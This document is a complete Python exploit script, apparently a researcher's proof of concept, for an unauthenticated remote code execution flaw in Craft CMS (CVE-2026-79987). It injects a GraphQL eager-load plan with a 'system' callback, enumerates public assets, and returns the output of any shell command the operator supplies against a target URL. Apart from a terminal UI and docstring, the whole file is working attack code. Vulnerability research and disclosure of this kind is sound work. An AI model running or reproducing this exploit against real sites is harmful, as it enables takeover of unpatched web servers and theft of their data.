#!/usr/bin/env python3
"""Craft CMS unauthenticated RCE via GraphQL eager-load injection (CVE-2026-79987).

An anonymous GraphQL query selects `uploader`, a field the public schema does not
expose, and smuggles a SQL projection plus a nested `when` callback into the
eager-load plan. Craft invokes the untyped EagerLoadPlan::$when as a PHP callable,
so `system` runs on a User whose name is projected from the command.

Needs a public GraphQL schema scoped to a site and an asset volume but not to user
groups, one asset with an uploader, and MySQL. Fixed in Craft 5.10.13. GHSA-9c4j-cjw3-r3xx
describes the authenticated element-search route; this anonymous GraphQL route shares
the same sink and fix but is not separately described in the advisory.
"""

import argparse
import json
import secrets
import shlex
import os
import sys

import requests

# --- self-contained terminal UI ---
_BANNER = r"""
  ____ ____      _    _____ _____
 / ___|  _ \    / \  |  ___|_   _|
| |   | |_) |  / _ \ | |_    | |
| |___|  _ <  / ___ \|  _|   | |
 \____|_| \_\/_/   \_\_|     |_|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color():
    global _COLOR
    _COLOR = False


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg):
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg):
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg):
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg):
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def die(msg):
    bad(msg)
    sys.exit(1)


def output(data, label="command output"):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    if isinstance(data, str):
        data = data.encode()
    sys.stdout.buffer.write(data)
    if data and not data.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---


def post(endpoint, query):
    return requests.post(endpoint, json={"query": query},
                         headers={"X-Craft-Gql-Cache": "no-cache"}, timeout=30)


def mysql_char(value):
    return "CHAR(" + ",".join(str(b) for b in value.encode()) + ")"


def exploit_query(asset_id, command):
    return (
        'query { assets(id: [%s], limit: 1) { '
        'uploader(select: {id: "elements.id", siteId: "elements_sites.siteId", '
        'fullName: "%s"} with: {trigger: {path: "photo", when: "system"}}) { id } } }'
        % (json.dumps(str(asset_id)), mysql_char(command))
    )


def public_asset_ids(endpoint):
    offset = 0
    while True:
        try:
            assets = post(endpoint, f"{{ assets(limit: 100, offset: {offset}) {{ id }} }}").json()["data"]["assets"]
        except (KeyError, TypeError, ValueError):
            return
        if not assets:
            return
        for asset in assets:
            yield asset["id"]
        offset += len(assets)


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n  %(prog)s --url https://target.example --command id\n")
    ap.add_argument("--url", required=True, metavar="URL", help="Craft base URL")
    ap.add_argument("--command", default="id", metavar="CMD", help="command to run (default: id)")
    ap.add_argument("--asset-id", metavar="ID", help="public asset with an uploader (default: enumerate)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        disable_color()

    banner("unauthenticated GraphQL eager-load RCE  ·  CVE-2026-79987")
    endpoint = f"{args.url.rstrip('/')}/index.php?p=actions/graphql/api"
    info(f"Target {endpoint}")

    nonce = secrets.token_hex(8)
    start, end = f"S{nonce}", f"E{nonce}"
    command = f"printf %s {shlex.quote(start)}; {args.command}; printf %s {shlex.quote(end)}"

    if args.asset_id:
        ids = [args.asset_id]
    else:
        info("Enumerating public assets for one with an uploader")
        ids = public_asset_ids(endpoint)

    info(f"Injecting eager-load plan (uploader.when = system)")
    for asset_id in ids:
        body = post(endpoint, exploit_query(asset_id, command)).content
        a = body.find(start.encode())
        b = body.find(end.encode(), a + len(start))
        if a != -1 and b != -1:
            good(f"Executed as the PHP worker via asset {asset_id}")
            output(body[a + len(start):b])
            return
    die("No public asset with an uploader returned command output")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
